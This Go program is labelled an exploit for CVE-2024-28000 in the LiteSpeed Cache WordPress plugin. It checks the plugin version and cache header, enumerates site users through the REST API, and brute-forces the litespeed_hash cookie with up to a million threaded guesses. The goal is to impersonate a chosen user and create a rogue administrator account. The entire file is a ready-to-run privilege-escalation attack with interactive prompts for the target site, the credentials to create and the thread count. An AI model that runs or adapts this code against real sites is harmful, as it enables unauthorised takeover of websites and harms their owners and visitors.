package main

import (
	"context"
	"fmt"
	"math/rand"
	"net/http"
	"os"
	"strconv"
	"strings"
	"time"
	"unicode/utf8"

	"github.com/aherve/gopool"
	"github.com/carlmjohnson/requests"
	"github.com/schollz/progressbar/v3"
)

var testhash string

func checkplugin(site string) (vuln bool) {
	var s string
	err := requests.
		URL(site + "/wp-content/plugins/litespeed-cache/readme.txt").
		ToString(&s).
		Fetch(context.Background())
	if err != nil {
		fmt.Println("I can't connect to "+site, err)
		os.Exit(1)
	}
	if strings.Contains(s, "Stable tag:") {
		index := strings.Index(s, "Stable tag:")
		version := strings.Fields(s[index:])
		versplit := strings.Split(version[2], ".")
		verint, err := strconv.ParseFloat(versplit[0]+"."+versplit[1], 64)
		if err != nil {
			fmt.Println("Can't convert version: "+version[2], err)
			os.Exit(1)
		}
		if verint > 6.4 {
			fmt.Println("Version: "+version[2]+" Not Vulnerable", err)
			return false
		} else {
			fmt.Println("Version: " + version[2] + " Vulnerable")
			return true
		}
	}
	return false
}

func checktag(site string) (tag bool) {
	headers := http.Header{}
	err := requests.
		URL(site).
		ToHeaders(headers).
		Fetch(context.Background())
	if err != nil {
		fmt.Println("I can't connect to "+site, err)
		os.Exit(1)
	}
	if headers.Get("x-litespeed-tag") == "" {
		fmt.Println("Tag not found")
		return false
	} else {
		fmt.Println("Tag Found")
		return true
	}
}

func hashgen(site string) (result bool) {
	var res string
	err := requests.
		URL(site + "/wp-admin/admin-ajax.php?action=async_litespeed&litespeed_type=crawler").
		ToString(&res).
		CheckStatus(200).
		Fetch(context.Background())
	if err != nil {
		fmt.Println("Hash generation Error", err)
		return false
	} else {
		fmt.Println("Hash generated")
		return true
	}
}

func rrand(len int) string {
	rand.NewSource(time.Now().UnixNano())
	var charlist = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
	str := ""
	max := utf8.RuneCountInString(charlist) - 1
	for i := 0; i < len; i++ {
		str += string(charlist[rand.Intn(max+1)])
	}
	return str
}

type stjson struct {
	Username string   `json:"username"`
	Password string   `json:"password"`
	Email    string   `json:"email"`
	Roles    []string `json:"roles"`
}

type users []struct {
	ID          int    `json:"id"`
	Name        string `json:"name"`
	URL         string `json:"url"`
	Description string `json:"description"`
	Link        string `json:"link"`
	Slug        string `json:"slug"`
	AvatarUrls  struct {
		Num24 string `json:"24"`
		Num48 string `json:"48"`
		Num96 string `json:"96"`
	} `json:"avatar_urls"`
	Meta  []any `json:"meta"`
	Links struct {
		Self []struct {
			Href string `json:"href"`
		} `json:"self"`
		Collection []struct {
			Href string `json:"href"`
		} `json:"collection"`
	} `json:"_links"`
}

func userenum(site string) (listusers users) {
	var post users
	err := requests.
		URL(site + "/wp-json/wp/v2/users").
		ToJSON(&post).
		Fetch(context.Background())
	if err != nil {
		fmt.Println("I can't enum users")
		os.Exit(1)
		return nil
	} else {
		return post
	}

}

func testcradmin(site string, hash string, user string, password string, pool *gopool.GoPool, id string) (created bool) {
	defer pool.Done()
	var res string
	data := stjson{
		Username: user,
		Password: password,
		Email:    "admin@ajax.com",
		Roles:    []string{"administrator"},
	}

	err := requests.
		URL(site+"/wp-json/wp/v2/users").
		Cookie("litespeed_role", id).
		Cookie("litespeed_hash", hash).
		Header("Content-Type", "application/json").
		CheckStatus(201).
		BodyJSON(&data).
		ToString(&res).
		Fetch(context.Background())
	if err != nil {
		return false
	} else {
		fmt.Println("Account Created")
		os.Exit(1)
		return true
	}
}

func main() {
	var i, u, p, t, d string
	fmt.Println(" _______  __   __  _______         _______  _______  _______  _   ___         _______   _____   _______  _______  _______ ")
	fmt.Println("|       ||  | |  ||       |       |       ||  _    ||       || | |   |       |       | |  _  | |  _    ||  _    ||  _    |")
	fmt.Println("|       ||  |_|  ||    ___| ____  |____   || | |   ||____   || |_|   | ____  |____   | | |_| | | | |   || | |   || | |   |")
	fmt.Println("|       ||       ||   |___ |____|  ____|  || | |   | ____|  ||       ||____|  ____|  ||   _   || | |   || | |   || | |   |")
	fmt.Println("|      _||       ||    ___|       | ______|| |_|   || ______||___    |       | ______||  | |  || |_|   || |_|   || |_|   |")
	fmt.Println("|     |_  |     | |   |___        | |_____ |       || |_____     |   |       | |_____ |  |_|  ||       ||       ||       |")
	fmt.Println("|_______|  |___|  |_______|       |_______||_______||_______|    |___|       |_______||_______||_______||_______||_______|")
	fmt.Println("Exploit for CVE-2024-28000 v1.1 By JohnDoeAnonITA")
	fmt.Print("Enter the site: ")
	fmt.Scan(&i)
	fmt.Print("User to create: ")
	fmt.Scan(&u)
	fmt.Print("Password to create: ")
	fmt.Scan(&p)
	usersfind := userenum(i)
	fmt.Println("Users:")
	fmt.Println("--------")
	for _, oneuser := range usersfind {
		fmt.Println("ID: " + strconv.Itoa(oneuser.ID))
		fmt.Println("User: " + oneuser.Name)
		fmt.Println("--------")
	}
	fmt.Print("Enter ID: ")
	fmt.Scan(&d)
	fmt.Print("Threads: ")
	fmt.Scan(&t)
	threadsu, _ := strconv.Atoi(t)
	if checkplugin(i) {
		if checktag(i) {
			if hashgen(i) {
				pool := gopool.NewPool(threadsu)
				testhash = ""
				bar := progressbar.NewOptions(1000000, progressbar.OptionSetDescription("Testing: "+testhash))
				for e := 0; e < 1000000; e++ {
					testhash = rrand(6)
					bar.Add(1)
					bar.Describe("Testing: " + testhash)
					pool.Add(1)
					go testcradmin(i, testhash, u, p, pool, d)

				}
				pool.Wait()
			}
		}
	}

}
